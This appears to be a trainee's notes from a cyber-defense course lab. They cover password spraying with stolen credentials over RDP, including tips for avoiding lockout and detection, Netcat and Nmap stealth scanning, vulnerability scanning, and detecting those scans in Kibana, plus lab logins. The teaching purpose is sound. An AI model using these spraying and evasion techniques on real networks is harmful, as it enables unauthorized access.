
![image](https://github.com/user-attachments/assets/bf9a5c0a-0063-4575-82e7-818ba119c1e4)![image](https://github.com/user-attachments/assets/98b78774-4ff3-405a-9aef-e72d52e27214)########## M6 L1 ############
######### Harvesting Credentials ###########

Workflow


1. Log in to the ch-tech1 Virtual Machine (VM) using the following credentials:
Username: trainee

Password: CyberTraining1!

2. Right-click the Windows icon, and select Run. In the Open: textbox, enter PowerShell, and select OK:

Figure 6.1-2

3. Navigate to and access the Sample-Dump.txt file using the following cmdlet:
   
PS C:\Users\trainee.vcch> Get-Content C:\Users\trainee.vcch\Sample-Dump.txt



The output from the cmdlet returns eight passwords and six usernames.
![image](https://github.com/user-attachments/assets/683ffcc9-6e0d-4678-8d5f-5a21db7bac0b)

![image](https://github.com/user-attachments/assets/42803332-6534-4b28-8184-6b3577a7f4fa)

-------------------------------------------------------------------------------------------

Harvesting Credentials by Password Spraying | Part 2
Now that the credential data dump has been accessed and is viewable in the PowerShell window, a small password spraying campaign can be executed to attempt to log into the network with stolen credentials. 

NOTE: The following steps continue from the previous task.

4. Navigate to the Windows Accessories folder, and select Remote Desktop Connection.

5. In the Computer: textbox, enter ch-tech-2 and select Show Options.

![image](https://github.com/user-attachments/assets/6f7a4436-4e36-4ae7-b9c5-216c994b5f01)

![image](https://github.com/user-attachments/assets/d756785b-2dbe-42e6-bcee-9ad0d4f11e51)

6. Attempt to log into ch-tech-2 by using each password with each user name. From here, conduct a password spraying campaign to attempt to access the vcch.lan with the information provided in the Sample-Dump.txt file. A password spraying technique is often referred to as the low and slow technique, and it will take some time to conduct a campaign of this type. With password spraying, many passwords are attempted against many accounts. This means it is best to attempt to log in to every username listed with the first password before moving to the second. This practice best avoids detection and account lockout. 


A successful campaign allows access into ch-tech-2:

![image](https://github.com/user-attachments/assets/cd027d67-c8b9-41db-b7a7-6021ed3f4abe)

-------------------------------------------------------------------------------------

Protecting Credential Data from Harvesting
Walk through accessing the network's primary Domain Controller (DC) to configure and enforce strict password settings in an effort to prevent credential harvesting. 

Workflow


1. Log in to the ch-dc1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿
2. The domain's password policy can be easily reviewed using PowerShell. To do so, select the Windows icon > Administrative Tools.


3. In the Administrative Tools window, select Windows PowerShell.


In the Windows PowerShell window, enter the following cmdlet:

PS C:\Users\trainee.vcch> Get-ADDefaultDomainPasswordPolicy

![image](https://github.com/user-attachments/assets/78c97562-67ec-492d-8ef2-6d55fe33508c)

----------------------------------------------------------------------

![image](https://github.com/user-attachments/assets/a7aa43d2-46ae-4db1-9db2-98cbea60323c)


-----------------------------------------------------------

![image](https://github.com/user-attachments/assets/6583d4ca-274c-4047-85ee-8503d082b986)

-------------------------------------------------------------

########## M6 L2 ############
######### Identifying Hosts and Services ###########


Workflow


1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Netcat comes on several distributions, but it may not always be installed on yours. Open a terminal window and run the following command to verify that Netcat is installed on the machine:
(trainee@dmss-kali)-[~] $ which nc


![image](https://github.com/user-attachments/assets/0af9a092-1a63-47ac-ac23-6822e38e6298)


Netcat is present on the system and located in /usr/bin/nc.


3. Run the following command to view the available options available for the utility:
(trainee@dmss-kali)-[~] $ nc -h


![image](https://github.com/user-attachments/assets/69293043-1f65-499a-998a-98f6e0285d4e)


The options used in the next step are -n, -v, and -w.


4. Run the following command to scan a host in the range's DMZ network:
(trainee@dmss-kali)-[~] $ nc -nvw 10 172.35.3.6 80



The complete command is explained as follows:
-n: Do not perform any lookups of addresses, hostnames, or ports
-v: Increase verbosity
-w: Set a timeout. In this case, Netcat waits 10 seconds before giving up attempting to establish a connection.

The host being scanned is 172.35.3.6, whose primary function is as a web server.


The port being scanned is 80 or HTTP.

![image](https://github.com/user-attachments/assets/d2d381a0-bd97-4d37-a8f0-89a09438ed82)

Notice that upon connection, the client hangs. At this point in time, the TCP connection has been established and the client can send and receive data, if desired. The takeaway from this action, however, is that the port is open.


5. Select CTRL+C to close the connection.


At times, the CDA may want to scan multiple ports at once. This is where the -z option comes in handy. -z indicates that Netcat sends zero data; it simply establishes the TCP handshake, and closes the connection automatically, if it can be established. This is preferable to the alternative of selecting CTRL+C after every port.


The nc command also takes multiple ports or port ranges to check various services on a host. For example, the following are valid syntaxes:
nc -nvz 8.8.8.8 20-25       #Scans ports 20, 21, 22, 23, 24, and 25
nc -nvz 8.8.8.8 22 23 80    #Scans ports 22, 23, and 80
nc -nvz 8.8.8.8 20-25 80    #Scans ports 20, 21, 21, 23, 24, 25, and 80



6. Run the following command to test if Secure Shell (SSH), TELNET, Simple Mail Transfer Protocol (SMTP), HTTP, HTTP Secure (HTTPS), and Post Office Protocol 3 (POP3) are open:
(trainee@dmss-kali)-[~] $ nc -nvz -w 10 172.35.1.21 22 23 25 80 443 110



In this case, the host being scanned is the core router in the range network.


NOTE: Netcat only prints outputs for ports that are open. All output can be seen by running the following command:
(trainee@dmss-kali)-[~] $ for port in 22 23 25 80 443 110; do nc -nvz -w 10 172.35.1.21 $port; done

![image](https://github.com/user-attachments/assets/5606388d-0419-4ea9-88ed-16e33655addc)


----------------------------------------------------------------------------------------------

ort Scanning and Banner Grabbing with Netcat
The resulting output from the previous command is shown below:


![image](https://github.com/user-attachments/assets/93217757-f710-4c55-aeb1-20d398028f49)


As detailed, SSH is open on this device. Now that the open port is verified, perform a banner grab to get more information on the service.


NOTE: The following steps continue from the previous task.


7. Run the nc command without the -z option on the open port to perform a banner grab:
(trainee@dmss-kali)-[~] $ nc -nvw 10 172.35.1.21 22



Depending on the service running or how the service is configured, the server may not always return a banner or data. This was seen in the first port scan against HTTP; even with the socket left open, the server sent no data. 

![image](https://github.com/user-attachments/assets/7f3b4864-1560-4b94-bea4-e63a2a5c04e0)


----------------------------------------------------------------------------------------

Workflow


1. Log in to the kali-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



At a minimum, Nmap only needs a host to run.


2. Run the following command to conduct a Nmap scan against a host.
(trainee@dmss-kali)-[~] $ nmap 172.35.3.6


![image](https://github.com/user-attachments/assets/463aba45-3efc-47fb-9f5b-c7ebe9a8602a)



This conducts host discovery to ensure that the host is up, and conducts a scan of the 1,000 most popular TCP ports.


By default, Nmap conducts host discovery before commencing the port scan. With multiple hosts, this saves time by ensuring that a host is there before blasting thousands of packets. Nmap's default host discovery uses four packets: an ICMP echo request, a TCP probe to 80 and 443, and an ICMP Timestamp request. If the user has superuser privileges, the TCP probes are a TCP ACK to port 80 and TCP SYN to port 443. If the user only has regular user privileges, then the TCP probes are both SYN packets. However, many hosts have ICMP disabled and/or firewall rules in place so the default scan many not give the user the best results depending on the circumstances. While Nmap's host discovery can be tailored to better fit the environment, this is not covered in this lesson. To skip host discovery, for reasons such as the host is known to be up or due to the target environment configuration, use the option -Pn. For example, the following command implements skipping host discovery: 
(trainee@dmss-kali)-[~] $ nmap -Pn 8.8.8.8



NOTE: Superuser privileges are required whenever crafting raw packets as it requires lower level access, e.g., a stray ACK in the case of Nmap's host discovery.


Depending on the user privileges, the scan is a TCP SYN Stealth scan as a superuser or a TCP Connect scan as a regular user. A TCP SYN Stealth scan sends a SYN, and if it receives a SYN/ACK, it replies with a RST; it never completes a full connection. This is less likely to create logs, as many applications only create logs after a connection has been established. The switch for a TCP SYN Stealth scan is -sS.
(trainee@dmss-kali)-[~] $ nmap -sS 8.8.8.8  #Must be run as root or with sudo 



A TCP Connect scan completes the TCP handshake, then closes the connection. No special privileges are required to run this type of scan. The switch for a Full Connect scan is -sT. The following Nmap command is an example of a TCP Connect scan:
(trainee@dmss-kali)-[~] $ nmap -sT 8.8.8.8



Nmap also allows the user to specify ports, if desired, with the -p option. Listed below are some examples of valid syntax with the -p option:
nmap -sS 8.8.8.8 -p 22			#Scan port 22
nmap -sS 8.8.8.8 -p 1-100		#Scan ports 1-100
nmap -sS 8.8.8.8 -p 5,6,7,8,9	#Scan ports 5,6,7,8,9
nmap -sS 8.8.8.8 -p-			#Scan all 65,535 ports
nmap -sS 8.8.8.8 -p-25			#Scan all ports up to 25
nmap -sS 8.8.8.8 -p65530-		#Scan all ports above port 65530

![image](https://github.com/user-attachments/assets/8702780b-b64e-47ae-aaf2-fcc6c6b926e5)


----------------------------------------------------------------------------------------------------------------


Workflow


NOTE: The following steps continue from the previous task.


3. In the kali-hunt VM, run the following command to enable service, version and OS detection on a host. The host in this command is the DNS server for the range network. The sudo command prompts for a password — CyberTraining1!
(trainee@dmss-kali)-[~] $ sudo nmap -sS -sV -O -Pn 172.35.3.2 


![image](https://github.com/user-attachments/assets/a5ab0af4-f025-4bc5-9272-1341006c4128)



Based on the results of the service version and OS detection, attempt to correlate publicly or privately known exploits to gain access. For example, since the DNS service was detected as Simple DNS Plus, use open-source research to determine if there are known exploits against that service. Finding exploits is covered in a future module.


--------------------------------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


4. Start a packet capture to observe the traffic being sent to the host to scan. The host in this case is 172.35.3.6, which is a web server within the range network.
(trainee@dmss-kali)-[~] $ sudo tcpdump -i eth1 -nnn 'host 172.35.3.7'

![image](https://github.com/user-attachments/assets/06790e54-8471-4b88-89f1-2769487a251d)

5. In a new window, run the following command to initiate a SYN Stealth scan against a web server host in the range network.
(trainee@dmss-kali)-[~] $ sudo nmap -sS -Pn 172.35.3.7

![image](https://github.com/user-attachments/assets/6f3454fd-c42e-482e-9368-ac3b98484951)

The packets can be seen leaving the kali host.

![image](https://github.com/user-attachments/assets/d3e06f10-5070-4a0a-8690-34090f1d47fe)


However, when the scan completes, it appears as if there is a firewall along the path to the device that is filtering traffic. Observe the packet capture. No response is ever generated from the host being scanned, so Nmap assumes that the host is filtered. Note that with the -Pn option, Nmap assumes a host is filtered if the host is not up.

![image](https://github.com/user-attachments/assets/bf919108-c657-408d-b0dc-16a0eaed9a2a)

6. Run an ACK Scan to check if the firewall is stateless. To save time, only one port is scanned, which in this case, is 22.
(trainee@dmss-kali)-[~] $ sudo nmap -sA -Pn -p 22 172.35.3.7


![image](https://github.com/user-attachments/assets/0cb6040c-5834-40d2-a2d7-a96eacdfa9fa)

Nmap reports this port as unfiltered. Observing the packet capture in the other window, it becomes evident why. This time, an RST response is received from the host.

![image](https://github.com/user-attachments/assets/6accdb8f-0290-4e99-a1cb-62da6a580485)

When a stateless firewall is found, the analyst can typically proceed with the other scans (i.e., NULL, FIN, XMAS). However, due to the underlying OSs within the range environment, the scans do not report accurate port state information. This is very common, as many modern OSs do not respond at all to these scans. 


7. Select CTRL+C to stop the tcpdump capture.

--------------------------------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


8. The host to investigate is a DNS server for the range network. Run the following command to scan the top 1,000 UDP ports:
(trainee@dmss-kali)-[~] $ sudo nmap -Pn -sU 172.35.3.2

![image](https://github.com/user-attachments/assets/0fb89d4c-7b91-480c-ad6a-96a9189b3e8b)

From the scan results, it appears that UDP port 53 is open, which corresponds to the DNS service.


NOTE: Nmap reports 999 other ports as open|filtered. Recall that this is due to UDP services not having a handshake as TCP services does, and is much more difficult to get a definitive state for.

------------------------------------------------------------

Workflow


NOTE: The steps continue from the previous task.


9. Run the following command to run a port scan for the range 20-25 with the aggressive timing template. This gives some idea of the time it takes to complete the scan.
(trainee@dmss-kali)-[~] $ sudo nmap -sS -Pn -T4 -p 20-25 172.35.3.1

![image](https://github.com/user-attachments/assets/041f297c-4c20-428a-946c-71f463a34faa)

The scan completes in 13.31 seconds for six ports on one host. Runtimes may differ slightly. 


10. Run the same command, only with the sneaky timing template (T1).
(trainee@dmss-kali)-[~] $ sudo nmap -sS -Pn -T1 -p 20-25 172.35.3.1



This may take a few minutes to run.


![image](https://github.com/user-attachments/assets/9410fba4-0680-48da-bdf1-2132dd408e1f)

Note the time difference between the two: 13 seconds versus just under two minutes for just six ports. If detection is not a concern, then finishing port scans quickly is ideal. However, based on the presence and configuration of security systems within the network, it may be necessary to take more time to scan the network to prevent tipping of IDSs/IPSs.

--------------------------------------------------------------

Fun with ACAS
ACAS is the Department of Defense's (DoD's) pick when it comes to vulnerability scanners. It is a robust, highly-configurable tool that is easy to start using. Its web interface is user friendly and intuitive. Use ACAS to conduct a vulnerability assessment.

﻿

1. Log onto the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Firefox ESR from the desktop.

![image](https://github.com/user-attachments/assets/f09598ab-aced-404d-9414-d6b7f1a5491c)


3. Select the ACAS bookmark, and enter the following credentials to log in to the web page.
Username: trainee
Password: CyberTraining1!



4. Accept the DoD Notice and Consent Banner.

![image](https://github.com/user-attachments/assets/d8590534-18e3-4a3f-af25-6ed758850f97)

5. Select New Scan.


![image](https://github.com/user-attachments/assets/64c5e815-86fa-4bf3-a774-c7dfba3c6ca8)

This displays the types of scan templates available to use.


6. Select Basic Network Scan.


The Basic Network Scan is a good choice when not much is known about the devices being scanned. In the Basic Network Scan, several options are preconfigured without allowing for changes. In scans such as the Advanced Scan, more options are available to change. For our purposes, the Basic Network Scan is a good starting point.

![image](https://github.com/user-attachments/assets/a3578f5b-2bee-423a-9bc8-4839c8e33cb8)

7. Enter the following information in the fields:
Name: Core-Services-Scan
Description: Vulnerability scan of devices in the Core Services subnet.
Folder: My Scans
Targets: 172.35.2.0/24

![image](https://github.com/user-attachments/assets/5acf643b-a516-4f83-bd82-815af9c39f76)

Figure 6.2-27


The 172.35.2.0/24 range is the subnet containing the servers in the network that provide infrastructure and core functionality such as DNS and Active Directory (AD).


ACAS has functionality to enable scheduling of preconfigured scans. This can be accessed by selecting Schedule under General. This functionality is not used in this lesson.

![image](https://github.com/user-attachments/assets/eca294d1-a1a8-448c-9ac5-3c1b50a80aa5)

The Discovery menu specifies how ACAS searches for hosts. There are limited options when using the Basic template; however, other scan templates allow more granularity. The default is used in this lab.

![image](https://github.com/user-attachments/assets/f8f351b7-ae6b-4f45-b529-777060fa29af)


The Assessment menu currently contains settings for web scans. In different scan templates in ACAS, there may be more options for different types of services. The default setting is used in this lab.

![image](https://github.com/user-attachments/assets/b7b14f6d-50fe-4be9-803e-779706a4a274)

The Report menu specifies how the output is formatted. The default setting is used in this lab.

![image](https://github.com/user-attachments/assets/3da283d7-6600-47f2-a76d-0586a7053fe4)

The Advanced menu provides timing options for this scan. Depending on the bandwidth of the network and the load of the hosts, it may be desirable to configure this to network specifications. In this case, leave the defaults.

![image](https://github.com/user-attachments/assets/cd4e1080-148e-4b8f-87d0-3767fad8305c)

8. Select Credentials > Windows, and enter the following information into the fields:
Authentication method: Password
Username: trainee
Password: CyberTraining1!
Domain: vcch.lan
Never send credentials in the clear: Enabled
Do not use NTLMv1 authentication: Enabled
Start the Remote Registry service during the scan: Disabled
Enable administrative shares during the scan: Disabled
Start the Server service during the scan: Enabled

![image](https://github.com/user-attachments/assets/c8e0dd60-0ed0-4ec5-9d6d-1b92b551f5bc)

The Plugins tab allows you to view the plugins used during the scan. With the Basic template, only the plugins used are visible. In other templates, plugins can be added or removed if information about the network is known. At this point in time, not much is known about the Core Services subnet, so the defaults are fine.

![image](https://github.com/user-attachments/assets/6af1dcea-9af2-493a-8eb9-b3bfe0888d54)




9. Select Save.


This takes the trainee to the My Scans screen.

![image](https://github.com/user-attachments/assets/d49274c3-807f-4750-a4e9-5909e5f0e49a)

10. Select the Play icon on the configured scan to begin the scan.


NOTE: This takes approximately 30 minutes to complete. Allow the scan to run in the background and continue with the next section of the lab while waiting for this to complete.

---------------------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


11. Run the following command to check what ports are open on the web server in the range environment.
(trainee@dmss-kali)-[~] $ sudo nmap -sS -T4 172.35.3.6


![image](https://github.com/user-attachments/assets/f1c8a06e-05ea-4495-b82d-964b381a575a)

After determining which ports are open, the appropriate scripts can be selected. On this distribution, scripts included with Nmap are located in /usr/share/nmap/scripts.


The naming convention allows for easy searching as each script begins with the protocol or service it was intended for.


12. View which scripts are available for HTTP by running the following command:
(trainee@dmss-kali)-[~] $ ls /usr/share/nmap/scripts/http-*

![image](https://github.com/user-attachments/assets/75c5f330-29b6-4309-8434-5e8be6a23865)

Some output has been truncated. To find more information about a particular script, use the --script-help option.


13. Find out more about the first HTTP script available — http-adobe-coldfusion-apsa1301.nse — by running the following command:
(trainee@dmss-kali)-[~] $ nmap --script-help http-adobe-coldfusion-apsa1301.nse

![image](https://github.com/user-attachments/assets/91aa5d17-83e9-45a4-abc0-58ceca3737f9)


Notice the Categories line in the output. For this script, the categories are exploit and vuln. Nmap classifies their NSE scripts into different categories as listed in the attachment. This way, users can specify which category of scripts to run.


The -sC option enables the scripting engine, but to run specific scripts, use the --script option instead. The -sC option is the equivalent of --script=default. Default corresponds to the script category. 


The --script option allows for more granularity on what is run and accepts Boolean logic. For example, the string below is a valid argument for the script parameter:
--script "(http-* or postgresql-*) and (default or safe)"



This searches for scripts beginning with http or pgsql and only runs them if they are categorized as default or safe.


14. Run the following command to enable the NSE with the default scripts for each open port discovered from the previous scan:
(trainee@dmss-kali)-[~] $ sudo nmap -sC -p 80,443,5432 172.35.3.6



As shown below, NMAP was able to read the robots.txt file and examine the Transport Layer Security (TLS) certificates of the web and Postgresql server.

![image](https://github.com/user-attachments/assets/967c12a5-32df-4efe-bca3-d299b63be714)

--------------------------------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


15. Run the following command to scan a web server within the range environment with Nikto:
(trainee@dmss-kali)-[~] $ nikto -h 172.35.3.6



The -h specifies the host.

![image](https://github.com/user-attachments/assets/bc56288b-1607-4f0f-b6cf-21fc15058679)

he output from the scan is as explained:


Nikto was able to identify the version of the web server, which was Nginx 1.14.0 as per the first bullet. Nikto was also able to identify issues that may lead to clickjacking and XSS, as well as a potential rendering issue that may occur on web browsers from the following three bullets. Clickjacking is when an attacker uses transparent or opaque layers over the actual content of the page to cause a user to click on the attacker's link and sends the user to a malicious page. The clickjacking issue was discovered due to a lack of the X-Frame-Options header, as referenced by the second bullet in the output. The XSS issue comes from an absent X-XSS-Protection header, as evidenced by the third bullet. The potential rendering issue is also the result of a missing header, the X-Content-Type-Options header as per the fourth bullet.


The scan took 2 minutes and 36 seconds, which is reasonably short.

---------------------------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


16. Select the Vulnerabilities tab.

![image](https://github.com/user-attachments/assets/0af9245f-38da-4803-9532-7390d3139eee)

Notice that each individual vulnerability is grouped into a Family. It is possible to toggle the grouping with the gear icon, but this is not performed in this lesson.


17. Select the first Family: Microsoft Windows (Multiple Issues).


![image](https://github.com/user-attachments/assets/080d591d-878d-47a2-b3da-309fb2247d41)

This page displays a listing of vulnerabilities from most severe to least. From the scan report, one of the hosts is affected by a remote code execution vulnerability.


18. Select MS14-066 to find out more about it.

![image](https://github.com/user-attachments/assets/c6515d72-d22d-4972-b354-7d45c00082ac)

A general Description, Solution, the Plugin Details used to detect the vulnerability, Risk Information, Vulnerability Information, etc., can be found under each vulnerability.


19. Use the scan results to answer the following questions.

![image](https://github.com/user-attachments/assets/4ef9b29a-2f2a-4e8a-8f18-bdb7a68f97b1)

![image](https://github.com/user-attachments/assets/31cb388f-8996-4982-bdc5-3eb13c5004ed)

Lab Recap
Vulnerability scanners highlight the importance of keeping software updated and disabling unneeded services. In this lab, trainees experimented with the vulnerability scanners ACAS, NMAP NSE, and Nikto. Trainees are now familiar with usage of the aforementioned tools, and can now use these tools on CPT missions that may require them. 

--------------------------------------------------------------------------------

Detecting Scanners
Luckily for network defenders, port and vulnerability scanners are generally noisy. Depending on the scanning software and options selected while running, it can be easy to spot these scanning tools in traffic. Use Zeek logs to identify scanning activities in Kibana.

﻿

Workflow

﻿

1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Firefox ESR, and select the Security Onion bookmark.

﻿

3. Enter the following credentials when prompted.

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

4. After successfully logging in, select Kibana from the side menu, and navigate to the Discover page.

﻿

5. Set the time range to the following: Oct 12, 2021 @ 11:30:00 - Oct 12, 2021 @ 12:00:00.

﻿

6. Enter the following query in the search bar:

event.dataset:conn
﻿

This filters for all connection logs created by Zeek. There are 6,528 results. Also, there is an obvious bump where there was a surplus of traffic. 

![image](https://github.com/user-attachments/assets/1b38d00b-4f9c-4ac2-86ed-25021a046790)



7. Toggle the following fields:
source.ip
destination.ip
destination.port
connection.state
client.packets
server.packets

![image](https://github.com/user-attachments/assets/f126c788-cc91-44f5-86a5-1cf2e49c082c)

Connection states are values defined by Zeek and are broken out as follows:

![image](https://github.com/user-attachments/assets/188d6916-4579-4021-b3cb-11042c63b544)

Typical connections end with SF.


A server with an open port scanned using a TCP Connect or SYN Stealth scan results in a connection.state with the code RSTO.


A server with a closed port scanned using a Connect or a SYN results in a REJ.


A server with a filtered port scanned using either a TCP SYN or Connect results in a state of S0.


Finally, a garbage package resulting from an ACK, FIN, Xmas, Null, Maimon, etc., scans results in OTH.


Putting this all together, a TCP Connect scan can be characterized by a single host attempting to connect to multiple ports; a short session length of only one packet (client SYN, filtered port), two packets (client SYN, server RST), or four packets(client SYN, server SYN/ACK, client ACK, client RST) between the client and the server; and a combination of S0 or REJ and SF. TCP SYN scans share many characteristics of TCP Connect scans, except the maximum amount of packets possible is three — the client SYN, the server SYN/ACK, and a following client RST.


8. Observe the connections that occurred during the traffic spike by selecting the 11:56 bar.

![image](https://github.com/user-attachments/assets/0b0bdfb2-9a9f-4933-a2a0-c6ad458e9f10)

It is evident that the host responsible for starting the scans is 199.63.64.51 after scrolling through the results and seeing several seemingly random ports with no responses. Also, ports are not opening are filtered, as indicated by the S0 connection state and no server packets. Recall that an unfiltered host returns a RST, resulting in a server.packet count of 1.

![image](https://github.com/user-attachments/assets/9a7d72f4-2578-47a0-8858-6f97836a5c40)

9. Filter for this host by running the following query:
event.dataset:conn and source.ip:199.63.64.51



To determine which type of scan it was, locate the behavior of the scan after an open port was found. This means that there are at least two client packets, the first being a SYN, and the second packet either being an ACK for a TCP Connect Scan or a RST for a SYN Stealth Scan.


10. Run the following query to check the behavior of the scanning host after an open port is detected:
event.dataset:conn and source.ip:199.63.64.51 and client.packets>=2

![image](https://github.com/user-attachments/assets/4a3d516b-5267-4032-b134-822277b5dca4)

![image](https://github.com/user-attachments/assets/70181505-b6e6-4695-98ea-6c7cc2335f40)

-------------------------------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


11. Clear the current search and set the time range to October 12th, 2021 14:30 - October 12th, 2021 16:00. The columns toggled in the previous steps should still be set.

![image](https://github.com/user-attachments/assets/557ebaed-2750-4ebf-9b3b-0be75f249457)


12. Run the following query to filter for only Zeek connection logs.
event.dataset:conn

![image](https://github.com/user-attachments/assets/e25ba4b6-f5ba-45a3-ba32-30c30befdc62)

The scans are not nearly as obvious now. Recall that in the previous scan, there was a single large spike, but is not immediately noticeable here. The -T0 option was used to run this scan, which is why it blends in with the traffic much better. Luckily, there are a few methods of detecting these scans. The first method that was examined uses the behavioral characteristics of Nmap scans that were examined in previous steps. This time, search for packets generated by open AND closed ports. The purpose of this is to identify any potential port scanning behavior at all. A few port probes may be normal, but a large range of ports scanned by the same host appears more suspicious.


13. Run the following query to search for scanning behavior:
event.dataset:conn and source.ip:199.63.64.51 and ((client.packets>=1 and client.packets<=3) and server.packets<=1)



Now, the scanning becomes more apparent. 

![image](https://github.com/user-attachments/assets/41fd873d-5a98-491e-bdbd-39995b79a81a)

Scrolling through the results, there is a wide range of ports and short sessions, which points towards a port scanning attempt.


There are a few sessions with three client packets despite all being SYN packets. For all intents and purposes, they should be interpreted as their own connection.


The second detection method covered in this lesson uses Nmap's TCP options. Recall that Nmap uses TCP options to identify host OSs. Ironically, Nmap can be identified via its TCP options as well, namely its TCP Window Size. Nmap sets a default window size of 1024, which is not a typical window size. Typically, OSs have the maximum window size set, not including the scaling factor in the TCP options. This makes identification easier, as a scan can be detected in as little as a single packet. Currently, there is not an easy way to set the TCP Window Size using the Nmap utility itself without recompiling the program. Use the Suricata event module to identify Nmap scans.


14. Run the following query to filter for Suricata events:
event.module:suricata and message:NMAP

![image](https://github.com/user-attachments/assets/89d69c0d-e55a-4b5f-b3b8-49e789fda8ee)


15. Toggle the following fields:
rule.name
message

![image](https://github.com/user-attachments/assets/33d7402f-de66-45df-9406-259b9234df2c)

As the rule.name and message fields state, a possible NMAP scan was detected. The rule used simply matches on window size, with the threshold to generate an alert being 5 packets in 60 seconds, which is why the graph does not exactly match up with the previous query.

![image](https://github.com/user-attachments/assets/2b408d24-a8ce-4db5-bb0c-1ea296827c6d)


--------------------------------------

Workflow


NOTE: The following steps continue from the previous task.


16. Set the time range to the following: October 12, 2021 14:00 - October 12, 2021 15:00

![image](https://github.com/user-attachments/assets/c65f0d50-ba3d-4eda-ba0f-9465419fb45f)

17. Filter the events for Zeek connection logs:
event.dataset:conn

![image](https://github.com/user-attachments/assets/9b28332f-4cad-4275-8465-74db40932e70)

As with Nmap, there is a huge spike in traffic. However, the traffic spike lasts longer than with a Nmap scan.


18. Select the highest point of the traffic spike, which begins at 14:08. Note that the beginning of the spike starts at 14:07, which is where port scanning occurs. This largely appears the same as Nmap scanning.

![image](https://github.com/user-attachments/assets/33b3a8a5-b164-44d8-afa0-18527f740c0c)


![image](https://github.com/user-attachments/assets/d4d542d3-3134-4106-9657-efdef26e65ac)

-----------------------------------------------

etecting Nikto Scans
Examine what Nikto scans look like in traffic.

﻿

Workflow

﻿

NOTE: The following steps continue from the previous task.

﻿

19. Set the time range to the following: October 12, 2021 16:30 - October 12, 2021 17:00

﻿

Unlike the other scans examined, Nikto scans are most prominent in Zeek HTTP Logs.

﻿

20. Filter for HTTP logs by running the following query:

event.dataset:http

![image](https://github.com/user-attachments/assets/a8e9728a-a11f-40b1-bb02-dac6ac55969a)

Like the other scans, Nikto is marked by a significant uptick in traffic.


21. Select the highest peak which starts at 16:57.


22. Toggle the following fields:
source.ip
destination.ip
http.status_code
http.uri
http.request.body.length
http.response.body.length

![image](https://github.com/user-attachments/assets/fbcbd8cf-e845-44a9-895e-33500dc3f0f6)

Upon first glance, several HTTP 301s can be seen from 199.63.64.51. There are a few HTTP 404s that can be seen but may not come from 199.63.64.51.


![image](https://github.com/user-attachments/assets/13feb66d-c0ea-4ff0-b4d8-28c6716a5305)

If the source IP address was not known, then it is found by selecting the highest spike. However, this view is not much more useful as there is not much to glean, other than the excess of HTTP 301s.


23. Return the time range to October 12, 2021 16:30 - October 12, 2021 17:00, and run the following query to filter out web connections from different hosts:
event.dataset:http and source.ip:199.63.64.51

![image](https://github.com/user-attachments/assets/c7278536-97e4-4f34-b23d-3bd3478f3dd7)

After filtering for 199.63.64.51, much more spookiness is seen. First, notice the user agent string Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007239), which not only stands out, but lets the user know exactly what program is running the vulnerability scan. While script kiddies may not know to change the user agent value, it is trivial to do so by changing the user agent string in the config file.


Because of this, relying on the user agent to identify Nikto is not always reliable. However, the behavior is used to more consistently identify scanning attempts. Note the http.uri field. Nikto attempts to brute force several config files, security-related files, account files, database files, etc. This is not normal user behavior and can be marked as related to scanning activity. A signature that could catch this might trigger an alert if three or more different Uniform Resource Identifiers (URI) from the results are requested. Nikto has built-in evasion techniques to attempt circumvention.


24. Set the time range to October 12, 2021 17:00 - October 12, 2021 17:30. Do not clear the current query or any fields.

![image](https://github.com/user-attachments/assets/380bd770-b6fb-4642-9f1e-f6d6d0e18427)

This Nikto scan used an IDS evasion technique. Scrolling through the results, it is evident that some URIs are using Uniform Resource Locator (URL) encoding, which may circumvent some signatures. URL encoding enables characters outside of the ascii range and special characters. URL uses the percent sign (%) and hexadecimal to encode characters, e.g. a space is encoded as %20. to be transmitted over the Internet. In the data, we can see a %27, which is the ' character encoded. Nikto does not have a timing option, however, and abnormal traffic patterns such as spikes can trigger alerts if the evasion techniques avoid signatures.

-------------------------------------------------

 Practical Scenario
The local network defenders of the City Hall network have recently incorporated a Demilitarized Zone (DMZ) and want to know of any scanning activities that might occur on the network segment. The CPT has been tasked with hunting any possible scanning activities on the segment. The local network defenders have a Systems and Information Event Manager (SIEM) configured, as well as network taps set up throughout the network. Locate any evidence of scanning activities.

﻿

DMZ Network: 172.35.3.0/24

﻿

1. Set your time range to the following: October 13, 2021 08:00 - October 13, 2021 09:30

﻿

2. Answer the following question based on the contents in Kibana.


![image](https://github.com/user-attachments/assets/8bb8e1b3-6ba4-49db-ad5b-673490c34da3)


![image](https://github.com/user-attachments/assets/5cc04021-a129-4011-9f92-4263a323c478)


![image](https://github.com/user-attachments/assets/caf9664d-26cf-4b61-9670-29c67034de49)

----------------------------------------------------------

########## M6 L3 ############
######### Wireless Sniffing ###########

Practical Defenses | Detecting Rogue Access Points
Workflow

﻿

1. Log in to the win-hunt Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the eviltwin-wlan.cap file on the desktop.

![image](https://github.com/user-attachments/assets/6aac0fd7-90ef-4280-bc04-ecab7dd8eb7e)

In this mission partner network, the adversary has been sniffing on the PublicLibrary network.


3. Filter for the PublicLibrary SSID by entering the following Wireshark filter:
wlan.ssid == "PublicLibrary"



This filter matches a specific portion of the wireless packet frame with the hexadecimal characters given. This section of the frame corresponds to the SSID of the packet and the string PublicLibrary.

![image](https://github.com/user-attachments/assets/dcb110c8-74c5-42db-850b-c3621744f32e)

The following is a list of known good BSSIDs employed by the mission partner in their wireless networks:

1c:87:2c:68:2c:18

03:e6:b8:54:cd:2a

7e:12:6d:00:9f:b2

25:aa:4d:89:b3:cf

Below is an example of a known good BSSID found in this network capture:

![image](https://github.com/user-attachments/assets/a991de6e-3a90-4abd-9497-570a942f636f)

